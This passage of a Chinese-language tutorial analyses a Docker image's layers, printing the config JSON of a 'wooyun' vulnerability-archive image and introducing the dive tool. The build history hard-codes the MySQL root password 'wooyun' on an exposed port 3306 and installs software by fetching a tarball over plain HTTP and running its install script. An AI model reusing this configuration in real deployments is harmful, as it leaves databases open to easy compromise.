class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;architecture&quot;</span><span class="punctuation">:</span><span class="string">&quot;amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>     </span><br><span class="line">        	  <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;3306/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        	  <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        	  <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        	  <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        	  <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;WOOYUN_DB=wooyun&quot;</span><span class="punctuation">,</span><span class="string">&quot;DB_Root_Password=wooyun&quot;</span><span class="punctuation">,</span><span class="string">&quot;SITE_ROOT=/home/wwwroot/default&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:e751337e6949667e081b823b6c3ff0aaa9d6c62860fb20755873953118fb28ff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;/home/wwwroot/default/upload&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;/home/wwwroot/default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/autostart.sh&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;org.label-schema.build-date&quot;</span><span class="punctuation">:</span><span class="string">&quot;20200809&quot;</span><span class="punctuation">,</span><span class="attr">&quot;org.label-schema.license&quot;</span><span class="punctuation">:</span><span class="string">&quot;GPLv2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.label-schema.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS Base Image&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.label-schema.schema-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.label-schema.vendor&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.opencontainers.image.created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-08-09 00:00:00+01:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.opencontainers.image.licenses&quot;</span><span class="punctuation">:</span><span class="string">&quot;GPL-2.0-only&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;org.opencontainers.image.title&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS Base Image&quot;</span><span class="punctuation">,</span>           </span><br><span class="line">                  <span class="attr">&quot;org.opencontainers.image.vendor&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container&quot;</span><span class="punctuation">:</span><span class="string">&quot;1423d454aa6bb1ea6e6a6e98ad32c4aec4369eef6a58c5855d88c3f754ce81b3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;container_config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;1423d454aa6b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Domainname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStdout&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttachStderr&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ExposedPorts&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;3306/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;80/tcp&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Tty&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OpenStdin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StdinOnce&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><span class="punctuation">,</span><span class="string">&quot;WOOYUN_DB=wooyun&quot;</span><span class="punctuation">,</span><span class="string">&quot;DB_Root_Password=wooyun&quot;</span><span class="punctuation">,</span><span class="string">&quot;SITE_ROOT=/home/wwwroot/default&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Cmd&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/bin/sh&quot;</span><span class="punctuation">,</span><span class="string">&quot;-c&quot;</span><span class="punctuation">,</span><span class="string">&quot;#(nop) &quot;</span><span class="punctuation">,</span><span class="string">&quot;ENTRYPOINT [\&quot;/autostart.sh\&quot;]&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:e751337e6949667e081b823b6c3ff0aaa9d6c62860fb20755873953118fb28ff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Volumes&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;/home/wwwroot/default/upload&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;WorkingDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;/home/wwwroot/default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Entrypoint&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/autostart.sh&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;OnBuild&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;org.label-schema.build-date&quot;</span><span class="punctuation">:</span><span class="string">&quot;20200809&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.label-schema.license&quot;</span><span class="punctuation">:</span><span class="string">&quot;GPLv2&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.label-schema.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS Base Image&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.label-schema.schema-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.label-schema.vendor&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.opencontainers.image.created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-08-09 00:00:00+01:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.opencontainers.image.licenses&quot;</span><span class="punctuation">:</span><span class="string">&quot;GPL-2.0-only&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.opencontainers.image.title&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS Base Image&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;org.opencontainers.image.vendor&quot;</span><span class="punctuation">:</span><span class="string">&quot;CentOS&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:24.141981121Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;docker_version&quot;</span><span class="punctuation">:</span><span class="string">&quot;19.03.8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;history&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-08-10T18:20:08.948813347Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) ADD file:61908381d3142ffba798ae9a904476d19b197ab79d0338f14bec0f76649df8d4 in / &quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-08-10T18:20:09.298928893Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  LABEL org.label-schema.schema-version=1.0 org.label-schema.name=CentOS Base Image org.label-schema.vendor=CentOS org.label-schema.license=GPLv2 org.label-schema.build-date=20200809 org.opencontainers.image.title=CentOS Base Image org.opencontainers.image.vendor=CentOS org.opencontainers.image.licenses=GPL-2.0-only org.opencontainers.image.created=2020-08-09 00:00:00+01:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-08-10T18:20:09.474278304Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  CMD [\&quot;/bin/bash\&quot;]&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T07:45:50.273037587Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                     <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                     <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  MAINTAINER V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                     <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T07:45:50.535602119Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  ENV WOOYUN_DB=wooyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T07:45:50.800755999Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  ENV DB_Root_Password=wooyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T07:45:51.078089971Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  ENV SITE_ROOT=/home/wwwroot/default&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:16:36.486994633Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c set -x;yum -y install wget git;cd /tmp;wget http://soft.vpser.net/lnmp/lnmp1.7.tar.gz -cO lnmp1.7.tar.gz;tar zxf lnmp1.7.tar.gz \u0026\u0026 cd lnmp1.7;LNMP_Auto=\&quot;y\&quot; DBSelect=\&quot;6\&quot; DB_Root_Password=\&quot;$&#123;DB_Root_Password&#125;\&quot; InstallInnodb=\&quot;y\&quot; PHPSelect=\&quot;5\&quot; SelectMalloc=\&quot;1\&quot; ApacheSelect=\&quot;1\&quot; ServerAdmin=\&quot;\&quot; ./install.sh lamp;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:16:37.736561615Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) WORKDIR /home/wwwroot/default&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:16:39.029781199Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c set -x;rm -rf *;git clone https://github.com/V7hinc/wooyun_final.git ./;rm -rf Dockerfile;sed -i \&quot;s/root\\\&quot;)/$&#123;DB_Root_Password&#125;\\\&quot;)/\&quot; conn.php;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:22.48714402Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c set -x;lnmp mariadb restart;create_db_sql=\&quot;create database IF NOT EXISTS $&#123;WOOYUN_DB&#125;\&quot;;mysql -hlocalhost -P3306 -uroot -p$&#123;DB_Root_Password&#125; -e \&quot;$&#123;create_db_sql&#125;\&quot;;echo \&quot;正在下载wooyun_bugs_db.tar.bz2文件\&quot;;wget -c https://github.com/V7hinc/wooyun_final/releases/download/1.0/wooyun_bugs_db.tar.bz2;tar xjvf wooyun_bugs_db.tar.bz2 -C /usr/local/mariadb/var/$&#123;WOOYUN_DB&#125;;rm -rf wooyun_bugs_db.tar.bz2;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:23.277388147Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c set -x;echo \&quot;#!/bin/bash\&quot; \u003e\u003e /autostart.sh;echo \&quot;lnmp restart;\&quot; \u003e\u003e /autostart.sh;echo \&quot;/bin/bash;\&quot; \u003e\u003e /autostart.sh;chmod 755 /autostart.sh;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:23.45705874Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  VOLUME [/home/wwwroot/default/upload]&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:23.63338606Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  EXPOSE 80&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:23.790678121Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  EXPOSE 3306&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:23.975235317Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop) WORKDIR /home/wwwroot/default&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="punctuation">&#123;</span><span class="attr">&quot;created&quot;</span><span class="punctuation">:</span><span class="string">&quot;2020-09-26T08:17:24.141981121Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;V7hinc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;created_by&quot;</span><span class="punctuation">:</span><span class="string">&quot;/bin/sh -c #(nop)  ENTRYPOINT [\&quot;/autostart.sh\&quot;]&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;empty_layer&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="string">&quot;linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rootfs&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;layers&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;diff_ids&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;sha256:613be09ab3c0860a5216936f412f09927947012f86bfa89b263dfa087a725f81&quot;</span><span class="punctuation">,</span><span class="string">&quot;sha256:211ed803113c21a810793cbc242ab2e7d4476c2ebeb6de8b56beed3f1c6409bc&quot;</span><span class="punctuation">,</span><span class="string">&quot;sha256:18134933659bea1138575ddd1ca379f76adfab1506a73355b2f8b9d85c3a5e21&quot;</span><span class="punctuation">,</span><span class="string">&quot;sha256:383c016287741f6073a01ced1227b2062be91e13f3874c2116619773f6b0d355&quot;</span><span class="punctuation">,</span><span class="string">&quot;sha256:5d287207f15bd783319d2adae013ef08ce2a18ece02f9ffec6f37ae1fac19ad8&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>该文件记录了镜像的关键信息，该链接简述了每一个字段的意义，如<code>config</code>包含了镜像生成容器时基础的执行参数，<code>Cmd</code>为容器入口点的默认参数 等。</p>
<p>我们主要关注的是 <code>history</code> 列表，它列出了镜像中的每一层，Docker 镜像由这些层堆叠而成。Dockerfile 中几乎每条命令都会变成一个层，描述该命令对镜像所做的更改。在ubuntu镜像中，可以看到history列表实际上有两层， 但是其中一层的<code>empty_layer</code> 标记为 <code>true</code>，这代表着本次操作不改变文件系统镜像，不额外生成新的层，所以ubuntu镜像实际上只有一层。</p>
<p>在docker中使用<code>docker inspect</code> （查看详细信息）和<code>docker history</code>（查看形成的历史过程） 命令也能查看镜像或容器的相关信息，该信息与上诉是一一对应的。</p>
<p>接下来打开<code>33b5e87a65b65985a0445827bd27436b3467bb578d1b1cc2aa0b6000685fb4bf</code>文件夹，该文件夹包含三个文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VERSION</span><br><span class="line">json</span><br><span class="line">layer.tar</span><br></pre></td></tr></table></figure>

<p>其中<code>VERSION</code>代表wooyun容器的版本，值为1.0；<code>json</code>文件的很多内容是与上面是重合的。镜像的核心内容在<code>layer.tar</code>里，将该文件解压，可以发现该文件夹的内容就是对应linux文件系统。在wooyun的镜像中，大部分文件存在于<code>var/www/html</code>中</p>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220815175950591.png" alt="image-20220815175950591"></p>
<blockquote>
<p>五个文件夹都是包含三个文件，只是各个操作系统版本不同等存在文件的差异</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="dive"><a href="#dive" class="headerlink" title="dive"></a>dive</h4><p>dive：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dhZ29vZG1hbi9kaXZl">https://github.com/wagoodman/dive</span></p>
<p>使用DIVE能够更好的查看镜像每一层的内容，和各层比上一层做出的改变，下图为dive分析ubuntu的界面。DIVE主要具有以下主要功能：</p>
<ul>
<li>屏幕左上角提供镜像层列表以及与每个镜像层的大小。</li>
<li>提供有关镜像的效率（百分比值）、潜在浪费的空间以及镜像的总大小的一般统计信息。</li>
<li>对于每个选定的镜像层，右边会显示出该层对应的文件系统视图，其中包含每个文件夹大小的数据。</li>
</ul>
<p>要分析Docker镜像，只需使用image tag/id/digest运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dive &lt;your-image-tag&gt;</span><br></pre></td></tr></table></figure>

<p>或者如果你想新建一个自己的image，那就直接使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dive build -t &lt;some-tag&gt; .</span><br></pre></td></tr></table></figure>

<h5 id="键绑定"><a href="#键绑定" class="headerlink" title="键绑定"></a>键绑定</h5><table>
<thead>
<tr>
<th align="center">密钥绑定</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><kbd>Ctrl + C</kbd></td>
<td align="center">退出</td>
</tr>
<tr>
